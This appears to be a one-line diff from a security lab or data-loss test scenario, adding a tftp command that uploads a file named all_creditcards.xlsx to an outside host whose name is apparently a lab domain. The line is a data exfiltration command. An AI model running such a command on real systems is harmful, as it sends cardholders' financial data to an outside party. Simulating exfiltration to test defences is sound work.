@@ -1,0 +1,1 @@
+tftp -i microsoft.lab-bcaseiro.com PUT c:\temp\usecase2\all_creditcards.xlsx
